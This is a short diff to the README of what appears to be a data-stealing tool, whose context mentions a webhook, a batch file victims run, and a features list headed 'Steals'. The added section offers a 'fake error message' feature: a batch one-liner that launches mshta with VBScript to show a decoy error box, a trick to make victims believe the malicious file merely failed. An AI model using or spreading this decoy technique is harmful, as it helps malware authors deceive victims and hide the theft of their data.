@@ -33,6 +33,13 @@
 * Just changing the webhook and doing nothing else. 
   * If the batch file does nothing the user will open it to see what's wrong.
 
+# Manual features that can be added
+
+Fake error message
+```batch
+start /min /b mshta vbscript:Execute("Msgbox(""Bodytext""+vbCrLf+vbCrLf+""Anotherbody""),16,""Titletext"":window.close")
+```
+
 # Features
 
 ### 💉 Steals
